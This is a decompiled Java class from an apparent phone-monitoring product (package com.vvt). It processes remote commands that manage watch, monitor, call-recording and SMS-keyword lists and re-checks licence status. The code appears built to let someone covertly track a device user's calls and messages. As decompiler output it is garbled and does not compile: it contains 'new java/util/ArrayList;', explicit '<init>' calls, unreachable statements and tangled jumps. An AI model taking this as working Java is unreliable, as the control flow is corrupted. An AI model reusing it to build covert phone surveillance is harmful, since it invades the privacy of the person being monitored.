package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.base.FeatureId;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.preference.FxPrefCommonList;
import com.vvt.preference.FxPreferenceType;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.input.RmtCtrlInputManageCommonData;
import com.vvt.remotecontrol.input.RmtCtrlInputManageCommonData.Operation;
import com.vvt.remotecontrol.output.RmtCtrlOutputResultSet;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class n
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private ControlCommand c;
  private AppEngine1 d;
  
  public n(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    this.c = paramControlCommand;
    this.d = paramh;
  }
  
  private FxPrefCommonList a(FeatureId paramFeatureId, com.vvt.preference.b paramb)
  {
    Object localObject = o.a;
    int i = paramFeatureId.ordinal();
    int j = localObject[i];
    switch (j)
    {
    default: 
      j = 0;
      localObject = null;
    }
    for (;;)
    {
      return (FxPrefCommonList)localObject;
      localObject = FxPreferenceType.WATCH_LIST;
      localObject = (FxPrefCommonList)paramb.a((FxPreferenceType)localObject);
      continue;
      localObject = FxPreferenceType.CIS_NUMBER;
      localObject = (FxPrefCommonList)paramb.a((FxPreferenceType)localObject);
      continue;
      localObject = FxPreferenceType.EMERGENCY_NUMBER;
      localObject = (FxPrefCommonList)paramb.a((FxPreferenceType)localObject);
      continue;
      localObject = FxPreferenceType.HOME_NUMBER;
      localObject = (FxPrefCommonList)paramb.a((FxPreferenceType)localObject);
      continue;
      localObject = FxPreferenceType.KEYWORD;
      localObject = (FxPrefCommonList)paramb.a((FxPreferenceType)localObject);
      continue;
      localObject = FxPreferenceType.MONITOR_NUMBER;
      localObject = (FxPrefCommonList)paramb.a((FxPreferenceType)localObject);
      continue;
      localObject = FxPreferenceType.NOTIFICATION_NUMBER;
      localObject = (FxPrefCommonList)paramb.a((FxPreferenceType)localObject);
      continue;
      localObject = FxPreferenceType.CALL_RECORDING_WATCH_NUMBER;
      localObject = (FxPrefCommonList)paramb.a((FxPreferenceType)localObject);
    }
  }
  
  private RmtCtrlOutputResultSet a(FeatureId paramFeatureId, RmtCtrlInputManageCommonData paramRmtCtrlInputManageCommonData, FxPrefCommonList paramFxPrefCommonList)
  {
    int i = 1;
    boolean bool1 = false;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = paramRmtCtrlInputManageCommonData.getOperation();
    bool2 = a;
    if (bool2) {}
    Object localObject3 = paramFxPrefCommonList.getList();
    List localList = paramRmtCtrlInputManageCommonData.getList();
    int m = ((List)localObject3).size();
    int n = paramFxPrefCommonList.getMaxCapacity();
    Object localObject4;
    if (localList != null) {
      if (paramRmtCtrlInputManageCommonData == null)
      {
        bool2 = false;
        localObject4 = null;
      }
    }
    for (;;)
    {
      boolean bool3 = a;
      if (bool3) {}
      ArrayList localArrayList = new java/util/ArrayList;
      localArrayList.<init>();
      int[] arrayOfInt = o.b;
      int i1 = ((RmtCtrlInputManageCommonData.Operation)localObject2).ordinal();
      i1 = arrayOfInt[i1];
      switch (i1)
      {
      }
      for (;;)
      {
        localObject4 = new com/vvt/remotecontrol/output/RmtCtrlOutputResultSet;
        ((RmtCtrlOutputResultSet)localObject4).<init>();
        ((RmtCtrlOutputResultSet)localObject4).setResultSet(localArrayList);
        bool1 = a;
        if (bool1) {}
        return (RmtCtrlOutputResultSet)localObject4;
        int j = localList.size();
        break;
        j += m;
        if (n < j)
        {
          localObject2 = new Object[i];
          localObject3 = b(paramFeatureId);
          localObject2[0] = localObject3;
          localObject4 = String.format("Cannot add phone number to %s list. Maximum capacity reached.", (Object[])localObject2);
          localObject1 = new com/vvt/remotecontrol/RemoteControlException;
          ((RemoteControlException)localObject1).<init>((String)localObject4);
          throw ((Throwable)localObject1);
        }
        localObject4 = FeatureId.SMS_KEYWORD;
        if (paramFeatureId != localObject4)
        {
          localObject2 = localList.iterator();
          do
          {
            k = ((Iterator)localObject2).hasNext();
            if (k == 0) {
              break;
            }
            localObject4 = (String)((Iterator)localObject2).next();
            k = com.vvt.aa.b.a((String)localObject4);
          } while (k != 0);
          localObject2 = new Object[i];
          localObject3 = b(paramFeatureId);
          localObject2[0] = localObject3;
          localObject4 = String.format("Cannot add phone number to %s list. Invalid phone number.", (Object[])localObject2);
          localObject1 = new com/vvt/remotecontrol/RemoteControlException;
          ((RemoteControlException)localObject1).<init>((String)localObject4);
          throw ((Throwable)localObject1);
          k = a(localList);
          if (k != 0)
          {
            localObject2 = new Object[i];
            localObject3 = b(paramFeatureId);
            localObject2[0] = localObject3;
            localObject4 = String.format("Cannot add phone number to %s list. Duplicate phone number.", (Object[])localObject2);
            localObject1 = new com/vvt/remotecontrol/RemoteControlException;
            ((RemoteControlException)localObject1).<init>((String)localObject4);
            throw ((Throwable)localObject1);
          }
          k = a;
          if (k == 0) {}
        }
        localObject2 = localList.iterator();
        do
        {
          k = ((Iterator)localObject2).hasNext();
          if (k == 0) {
            break;
          }
          localObject4 = (String)((Iterator)localObject2).next();
          k = ((List)localObject3).contains(localObject4);
        } while (k == 0);
        k = b;
        if (k != 0) {}
        localObject2 = new Object[i];
        localObject3 = b(paramFeatureId);
        localObject2[0] = localObject3;
        localObject4 = String.format("Cannot add phone number to %s list. Duplicate phone number.", (Object[])localObject2);
        localObject1 = new com/vvt/remotecontrol/RemoteControlException;
        ((RemoteControlException)localObject1).<init>((String)localObject4);
        throw ((Throwable)localObject1);
        localObject1 = localList.iterator();
        for (;;)
        {
          k = ((Iterator)localObject1).hasNext();
          if (k == 0) {
            break;
          }
          localObject4 = (String)((Iterator)localObject1).next();
          paramFxPrefCommonList.addItem((String)localObject4);
        }
        if (n < k)
        {
          localObject2 = new Object[i];
          localObject3 = b(paramFeatureId);
          localObject2[0] = localObject3;
          localObject4 = String.format("Cannot add phone number to %s list. Maximum capacity reached.", (Object[])localObject2);
          localObject1 = new com/vvt/remotecontrol/RemoteControlException;
          ((RemoteControlException)localObject1).<init>((String)localObject4);
          throw ((Throwable)localObject1);
        }
        localObject4 = FeatureId.SMS_KEYWORD;
        if (paramFeatureId != localObject4)
        {
          localObject2 = localList.iterator();
          do
          {
            k = ((Iterator)localObject2).hasNext();
            if (k == 0) {
              break;
            }
            localObject4 = (String)((Iterator)localObject2).next();
            k = com.vvt.aa.b.a((String)localObject4);
          } while (k != 0);
          localObject2 = new Object[i];
          localObject3 = b(paramFeatureId);
          localObject2[0] = localObject3;
          localObject4 = String.format("Cannot add phone number to %s list. Invalid phone number.", (Object[])localObject2);
          localObject1 = new com/vvt/remotecontrol/RemoteControlException;
          ((RemoteControlException)localObject1).<init>((String)localObject4);
          throw ((Throwable)localObject1);
          k = a(localList);
          if (k != 0)
          {
            localObject2 = new Object[i];
            localObject3 = b(paramFeatureId);
            localObject2[0] = localObject3;
            localObject4 = String.format("Cannot add phone number to %s list. Duplicate phone number.", (Object[])localObject2);
            localObject1 = new com/vvt/remotecontrol/RemoteControlException;
            ((RemoteControlException)localObject1).<init>((String)localObject4);
            throw ((Throwable)localObject1);
          }
          k = a;
          if (k == 0) {}
        }
        paramFxPrefCommonList.clearList();
        localObject1 = localList.iterator();
        for (;;)
        {
          k = ((Iterator)localObject1).hasNext();
          if (k == 0) {
            break;
          }
          localObject4 = (String)((Iterator)localObject1).next();
          paramFxPrefCommonList.addItem((String)localObject4);
        }
        paramFxPrefCommonList.clearList();
        continue;
        localObject4 = paramFxPrefCommonList.getList();
        localArrayList.addAll((Collection)localObject4);
      }
      int k = 0;
      localObject4 = null;
    }
  }
  
  private boolean a(List paramList)
  {
    boolean bool1 = false;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>(paramList);
    String str;
    do
    {
      int i = localArrayList.size();
      if (i <= 0) {
        break;
      }
      str = (String)localArrayList.get(0);
      localArrayList.remove(0);
      bool2 = localArrayList.contains(str);
    } while (!bool2);
    boolean bool2 = true;
    bool1 = a;
    if (bool1) {}
    for (;;)
    {
      return bool2;
      bool2 = false;
      str = null;
    }
  }
  
  private String b(FeatureId paramFeatureId)
  {
    Object localObject = o.a;
    int i = paramFeatureId.ordinal();
    int j = localObject[i];
    switch (j)
    {
    default: 
      localObject = "";
    }
    for (;;)
    {
      return (String)localObject;
      localObject = "watch";
      continue;
      localObject = "CIS";
      continue;
      localObject = "CIS";
      continue;
      localObject = "home";
      continue;
      localObject = "keyword";
      continue;
      localObject = "monitor";
      continue;
      localObject = "SMS_KEYWORD";
      continue;
      localObject = "call recording watch";
    }
  }
  
  public RmtCtrlOutputResultSet a()
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = this.c.getData();
    boolean bool2 = localObject instanceof RmtCtrlInputManageCommonData;
    if (bool2)
    {
      localObject = (RmtCtrlInputManageCommonData)localObject;
      FeatureId localFeatureId = ((RmtCtrlInputManageCommonData)localObject).getFeatureId();
      boolean bool3 = a;
      if (bool3) {}
      com.vvt.preference.b localb = this.d.n;
      boolean bool4 = a;
      if (bool4) {}
      FxPrefCommonList localFxPrefCommonList = a(localFeatureId, localb);
      localObject = a(localFeatureId, (RmtCtrlInputManageCommonData)localObject, localFxPrefCommonList);
      localb.b();
      bool3 = a;
      if (bool3) {}
      a(localFeatureId);
      bool2 = a;
      if (bool2) {}
      return (RmtCtrlOutputResultSet)localObject;
    }
    localObject = new com/vvt/remotecontrol/RemoteControlException;
    ((RemoteControlException)localObject).<init>("Expected data missing.");
    throw ((Throwable)localObject);
  }
  
  void a(FeatureId paramFeatureId)
  {
    Object localObject1 = this.d.k;
    Object localObject2 = ((com.vvt.license.b)localObject1).a();
    int i = ((LicenseInfo)localObject2).getConfigurationId();
    Object localObject3 = ((LicenseInfo)localObject2).getLicenseStatus();
    Object localObject4 = LicenseStatus.NOT_ACTIVATED;
    if (localObject3 == localObject4) {
      i = -1;
    }
    for (;;)
    {
      localObject1 = this.d.e.a(i).b();
      localObject2 = this.d.k;
      localObject3 = this.d.o;
      localObject4 = this.d.l.d();
      boolean bool = ((com.vvt.license.b)localObject2).a((com.vvt.productinfo.a)localObject3, (String)localObject4);
      localObject3 = this.d;
      i.a(paramFeatureId, (AppEngine1)localObject3, (List)localObject1, bool);
      return;
      localObject3 = ((LicenseInfo)localObject2).getLicenseStatus();
      localObject4 = LicenseStatus.EXPIRED;
      if (localObject3 == localObject4)
      {
        i = -2;
      }
      else
      {
        localObject2 = ((LicenseInfo)localObject2).getLicenseStatus();
        localObject3 = LicenseStatus.DISABLED;
        if (localObject2 == localObject3) {
          i = -3;
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/n.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */